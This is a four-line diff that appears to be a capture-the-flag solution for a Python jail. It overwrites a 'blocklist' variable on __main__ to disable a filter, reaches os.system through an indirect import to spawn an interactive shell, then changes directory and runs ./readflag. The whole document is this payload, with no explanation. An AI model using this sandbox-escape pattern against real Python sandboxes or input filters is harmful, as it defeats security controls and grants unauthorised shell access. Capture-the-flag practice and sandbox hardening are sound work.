@@ -1,0 +1,4 @@
+0 if setattr(__import__("__main__"), "block" + "list", "") else (the given expression here)
+vars(__import__("os"))["system"]("sh")
+cd ..
+./readflag
